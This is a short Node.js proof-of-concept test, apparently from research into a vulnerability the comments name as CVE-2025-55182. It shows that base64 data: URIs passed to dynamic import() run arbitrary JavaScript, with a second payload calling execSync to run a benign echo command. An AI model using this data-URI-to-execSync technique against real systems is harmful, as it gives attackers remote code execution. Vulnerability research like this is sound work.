/**
 * Test: Data URI dynamic import in Node.js
 *
 * The REAL CVE-2025-55182 exploit uses data: URIs with import()
 * Not the Function constructor path we were investigating!
 */

'use strict';

console.log('='.repeat(60));
console.log('Test: Data URI dynamic import');
console.log('='.repeat(60));
console.log('');

async function test() {
  // Create a malicious module as base64
  const code = `
    console.log('[RCE] Code executed during import!');
    export default function() { return 'pwned'; }
  `;

  const base64 = Buffer.from(code).toString('base64');
  const dataUri = `data:text/javascript;base64,${base64}`;

  console.log('[1] Payload:');
  console.log(`    Code: ${code.trim().slice(0, 50)}...`);
  console.log(`    Base64: ${base64.slice(0, 40)}...`);
  console.log(`    Data URI: ${dataUri.slice(0, 60)}...`);
  console.log('');

  console.log('[2] Attempting dynamic import of data: URI...');
  console.log('');

  try {
    // This is exactly what the vulnerable unbundled version does!
    const module = await import(dataUri);
    console.log('[3] Import succeeded!');
    console.log('    Module:', module);
    console.log('    Default export:', module.default);
    console.log('    Calling default():', module.default());
  } catch (e) {
    console.log('[3] Import failed:', e.message);
  }

  console.log('');
  console.log('[4] Testing with execSync payload...');

  const rceCode = `
    import { execSync } from 'node:child_process';
    const result = execSync('echo "RCE_SUCCESS"').toString().trim();
    console.log('[RCE] Command output:', result);
    export default function() { return result; }
  `;

  const rceBase64 = Buffer.from(rceCode).toString('base64');
  const rceDataUri = `data:text/javascript;base64,${rceBase64}`;

  console.log(`    Payload: ${rceCode.trim().slice(0, 50)}...`);
  console.log('');

  try {
    const rceModule = await import(rceDataUri);
    console.log('[5] RCE module loaded!');
    console.log('    Result:', rceModule.default());
  } catch (e) {
    console.log('[5] RCE failed:', e.message);
  }
}

test().catch(console.error);
